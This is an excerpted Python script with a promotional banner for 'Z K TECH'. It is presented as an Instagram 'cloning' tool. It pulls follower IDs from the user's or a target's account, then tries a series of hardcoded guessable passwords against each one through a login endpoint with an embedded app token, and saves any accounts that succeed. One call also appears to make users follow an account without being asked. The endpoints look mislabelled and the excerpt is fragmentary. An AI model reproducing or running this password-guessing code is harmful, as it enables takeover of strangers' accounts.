...
\033[1;92m┈┈┈┈•◈•ᑕᑐᑕᑐ•◈•┈┈╚══════╝  ╚═╝░░╚═╝┈┈•◈•ᑕᑐᑕᑐ•◈•																																		
  \033[1;92m ───•◈•ᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐ•◈•◈  																																		
   \033[1;93m███████▒▒\033[1;96mWelcome To Z_K\033[1;93m▒▒████████	
──────────────────────────────────────────
\x1b[1;97m--------------------------------------------------------------
\x1b[1;94m➣  YouTube  : Z K TECH
\x1b[1;94m➣  Facebook: ZEESHAN KHAN Z K
\x1b[1;94m➣  Github   : https://github.com/BHHZK9211
\x1b[1;94m➣  Instagram : TECHZK9211
\x1b[1;94m➣  Note     : Having Problem? Contact Me On instagram.
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "\033[1;97mAccess Granted "#Dev:ZEESHAN_KHAN
	    time.sleep(1)
            loop = 'false'
        else:
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.instagram.com/restserver.php"
				...
				requests.post('https://graph.instagram.com/me/followers?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
...
def menu():
	...
	try:
		...
		login()
	try:
		otw = requests.get('https://graph.instagram.com/me?access_token='+toket)
	...
	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
        ...
        print "\033[1;97m✧\033[1;97m.\033[1;97m2.\033[1;97m SUBSCRIBE Me On YouTube Or Instagram For Help"
...
def pilih_super():
	...
	if peak =="":
		...
		r = requests.get("https://graph.instagram.com/me/followers?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		...
		try:
			jok = requests.get("https://graph.instagram.com/"+idt+"?access_token="+toket)
		...
		r = requests.get("https://graph.instagram.com/"+idt+"/followers?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	...
	print "\033[1;97m[✔] Total followers \033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
...
---------------------------------------------------------"""		
	...
	def main(arg):
		...
		try:
			...
			pass #Dev:ZEESHAN_KHAN
		try:
			a = requests.get('https://graph.instagram.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '786786'
			data = urllib.urlopen("https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.instagram.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass1	
				oks.append(user+pass1)
			else:
				if 'www.instagram.com' in q["error_msg"]:
					...
					pass2 = '000786'
					data = urllib.urlopen("https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.instagram.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						...
						if 'www.instagram.com' in q["error_msg"]:
							...
							data = urllib.urlopen("https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.instagram.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								...
								if 'www.instagram.com' in q["error_msg"]:
									...
									data = urllib.urlopen("https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.instagram.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										...
										if 'www.instagram.com' in q["error_msg"]:
											...
											data = urllib.urlopen("https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.instagram.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												...
												if 'www.instagram.com' in q["error_msg"]:
													...
													data = urllib.urlopen("https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.instagram.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														...
														if 'www.instagram.com' in q["error_msg"]:
															...
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.instagram.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
	...
	print "\033[1;97m---------------------------------------------------"
	print"FOLLOW US ON INTSAGRAM 'TECHZK9211' FOR RECENT UPDATES & SUBSCRIBE US ON YOUTUBE 'Z K TECH' FOR RECENT NEW TRICKS"
